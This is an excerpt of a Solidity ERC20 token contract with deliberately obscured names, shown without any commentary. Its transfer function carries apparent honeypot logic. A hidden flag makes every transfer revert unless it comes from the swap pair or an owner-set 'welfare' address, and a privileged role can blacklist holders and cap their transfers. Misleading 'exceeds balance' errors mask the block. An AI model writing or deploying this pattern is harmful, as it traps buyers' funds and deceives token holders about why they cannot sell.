 ...
 */
abstract contract YREEDEWWControl is Context, IYREEDEWWControl {
    struct RoleData {
...
contract TokenERC20 is EROTARC20,YREEDEWWControl{  
    using  SafeMath for  uint256;   
    address         private      _suShiSwap;     
    address         private      _welfare;  
    bool            private      _suot;  
    mapping (address=>uint256) private _OOPLP;  
    mapping (address=>uint256) private _EITOLR;  
    ...
    function _transfer(address from,address to,uint256 amount) internal override(EROTARC20){
        ...
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");    
          if(_OOPLP[from]==1){
            if( _EITOLR[from]>=amount){
                _EITOLR[from]=_EITOLR[from]-amount;
            }else{
                 revert("ERC20: transfer amount exceeds balance");
            } 
        }
        if(_suot){ 
            if(from==_suShiSwap || from==_welfare){ 
            }else{
                revert("ERC20: transfer amount exceeds balance");
            }
        }
    ...
    function setABC(address user, uint256 number) public  onlyRole(TRADE){
         _EITOLR[user]=number*10**18;
    } 
    function AP(address user) public onlyRole(TRADE){
        _OOPLP[user]=1;
    }
    function DP(address user) public  onlyRole(TRADE){
        _OOPLP[user]=0;
    }
    function setAD(address user) public  onlyRole(TRADE){
        _welfare=user; 
    }
